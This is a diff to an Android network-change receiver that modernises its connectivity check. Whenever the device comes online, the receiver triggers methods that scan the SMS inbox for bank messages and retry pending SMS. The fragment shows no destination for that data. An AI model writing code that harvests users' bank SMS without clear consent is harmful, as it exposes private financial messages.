@@ -4,42 +4,39 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.os.Handler;
-import android.os.Looper;
+import android.net.Network;
 
 public class NetworkReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        runSync(context, 1000);
-        runSync(context, 5000);
-        runSync(context, 15000);
-        runSync(context, 30000);
-        runSync(context, 60000);
-    }
 
-    private void runSync(Context context, long delay) {
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            if (isOnline(context)) {
-                SmsReceiver.retryPendingSms(context.getApplicationContext());
-                SmsReceiver.scanInboxBankSmsToday(context.getApplicationContext(), 300);
-            }
-        }, delay);
-    }
+        if (context == null) return;
 
-    private boolean isOnline(Context context) {
         try {
             ConnectivityManager cm =
                     (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
 
-            if (cm == null) return false;
+            if (cm == null) return;
 
-            NetworkInfo info = cm.getActiveNetworkInfo();
-            return info != null && info.isConnected();
+            boolean isOnline = false;
 
-        } catch (Exception e) {
-            return false;
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                Network network = cm.getActiveNetwork();
+                isOnline = network != null;
+            } else {
+                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
+                isOnline = info != null && info.isConnected();
+            }
+
+            if (isOnline) {
+                Context app = context.getApplicationContext();
+
+                SmsReceiver.scanInboxBankSmsToday(app, 300);
+                SmsReceiver.retryPendingSms(app);
+            }
+
+        } catch (Exception ignored) {
         }
     }
 }
